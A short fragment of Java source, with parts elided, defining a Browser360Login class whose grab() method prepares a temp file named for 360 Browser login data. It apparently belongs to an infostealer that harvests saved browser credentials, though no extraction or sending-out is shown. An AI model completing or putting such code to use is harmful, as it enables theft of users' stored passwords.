...
public class Browser360Login {
    public static void grab() {
        Logger.log("Broswer360 Login", Logger.Type.INFO);
        String loginTemp = System.getProperty("java.io.tmpdir") + "browser360logindata.tmp";
        ...
        try {
            loginTempFile = File.createTempFile("browser360logindata", ".tmp");
